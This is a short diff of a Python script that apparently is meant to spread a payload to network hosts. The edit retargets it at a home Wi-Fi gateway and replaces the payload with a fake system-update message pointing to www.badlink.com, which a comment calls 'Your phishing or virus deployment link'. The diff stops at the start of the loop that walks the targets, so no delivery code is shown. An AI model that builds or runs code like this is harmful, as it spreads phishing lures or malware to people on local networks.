@@ -1,10 +1,12 @@
 import socket
 
 # List of target IP addresses or hostnames
-targets = ["192.168.0.1", "192.168.0.2", "192.168.0.3"]
+# 10.0.0.138 = WIFI gateway (all ips connect to this diffrent in all routers)
+targets = ["10.0.0.138", "192.168.0.2", "192.168.0.3"]
 
 # Payload to be delivered to infected hosts
-payload = "print('You've been infected!')"
+# www.badlink.com = Your phishing or virus deployment link
+payload = "print('You must update your system please head to www.badlink.com')"
 
 # Iterate through the targets
 for target in targets:
